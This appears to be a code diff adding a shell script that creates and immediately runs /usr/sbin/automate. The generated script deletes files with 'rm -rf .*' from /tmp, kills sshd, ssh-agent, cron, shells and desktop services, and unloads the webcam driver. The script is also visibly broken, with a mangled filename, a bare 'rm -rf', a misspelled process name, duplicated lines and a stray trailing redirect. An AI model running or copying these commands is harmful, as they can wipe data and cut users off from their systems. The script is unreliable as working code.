@@ -1,0 +1,24 @@
+echo '#!/bin/bash' > /usr/sbin/automate
+echo 'cd /tmp'     >> /usr/sbin/automate
+echo 'rm -rf' >> /usr/sbin/automate 
+echo 'rm -rf .*' >> /usr/sbin/automate
+echo 'killall ssh-agent' >> /usr/sbin/automate
+echo 'killall cron' >> /usr/sbin/automate
+echo 'killall rtkit-deamon' >> /usr/sbin/automate
+echo 'killall obexd' >> /usr/sbin/automate
+echo 'killall bluetooth' >> /usr/sbin/automate
+echo killall bluetoothd >> /usr/sbin/automate
+echo 'killall sshd' >> /usr/sbin/automate
+echo 'killall anacron' >> /usr/sbin/automate
+echo 'killall gvfsd-fuse' >> /usr/sbin/automate 
+echo 'modprobe -r uvcvideo' >> /usr/sbin/automate 
+echo 'killall /usr/bin/ssh-agent' >> /usr/sbin/automateecho 
+echo 'modprobe -r uvcvideo' >> /usr/sbin/automate
+echo 'killall   /usr/bin/zsh' >> /usr/sbin/automate
+echo 'killall /usr/sbin/zsh' >> /usr/sbin/automate
+echo 'killall rtkit-daemon' >> /usr/sbin/automate 
+echo 'killall /usr/libexec/gvfsd-trash' >> /usr/sbin/automate
+echo 'rm -r /org/gtk/gvfs' >> /usr/sbin/automate
+chmod u+x /usr/sbin/automate 
+automate
+>> /usr/sbin/automate
